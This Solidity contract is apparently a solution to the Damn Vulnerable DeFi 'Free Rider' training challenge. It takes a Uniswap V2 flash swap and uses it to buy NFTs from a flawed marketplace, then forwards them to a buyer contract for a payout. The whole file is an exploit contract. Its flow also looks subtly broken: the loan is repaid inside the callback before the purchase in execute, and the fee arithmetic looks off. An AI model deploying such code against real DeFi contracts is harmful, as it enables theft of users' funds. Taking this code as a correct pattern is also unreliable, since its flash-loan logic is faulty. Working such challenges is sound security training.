// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "hardhat/console.sol";

interface IUniswapV2Pair {
    function swap(uint256 amount0Out,uint256 amount1Out,address to,bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0,uint256 amount1,bytes calldata data) external;
}

interface IFreeRiderBuyer {
    function onERC721Received(address,address,uint256 _tokenId,bytes memory) external;
}

interface IERC721 {
    function setApprovalForAll(address operator, bool approved) external;
    function safeTransferFrom(address from,address to,uint256 tokenId) external;
}

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWETH {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/**
 * @title FreeRiderBuyer
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
    using Address for address payable;

    address partner;
    address nft;
    IFreeRiderBuyer buyer;
    IUniswapV2Pair uniswapPair;
    IWETH weth;
    address marketplace;

    constructor(
        address _partnerAddress,
        address _nftAddress,
        address _buyerContract,
        address _uniswapV2PairAddress,
        address _weth,
        address _marketplaceAdress
    ) payable {
        partner = _partnerAddress;
        nft = _nftAddress;
        buyer = IFreeRiderBuyer(_buyerContract);
        uniswapPair = IUniswapV2Pair(_uniswapV2PairAddress);
        weth = IWETH(_weth);
        marketplace = _marketplaceAdress;
    }

    function onERC721Received(address,address,uint256 _tokenId,bytes memory) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function execute(uint256[] calldata tokenIds) external payable {
        // Borrow from Uniswap
        uniswapPair.swap(15 ether, 0, address(this), hex"00");
        IFreeRiderNFTMarketplace(marketplace).buyMany{value: 15 ether}(
            tokenIds
        );
        transfer(tokenIds);
    }

    function transfer(uint256[] memory _tokenId) internal {
        for (uint256 i = 0; i < _tokenId.length; i++) {
            IERC721(nft).safeTransferFrom(address(this), address(buyer), _tokenId[i]);
        }
    }

    function uniswapV2Call(address,uint256,uint256,bytes calldata) external override {
       // withdraw WETH
       weth.withdraw(15 ether);


       // Calculate fee and pay back loan
       uint fee = ((15 ether * 3) / uint256(997)) + 1;
       weth.deposit{value: 15 ether + fee}();
       weth.transfer(address(uniswapPair), 15 ether + fee);


    }

    receive() external payable {}

    fallback() external payable {}
}


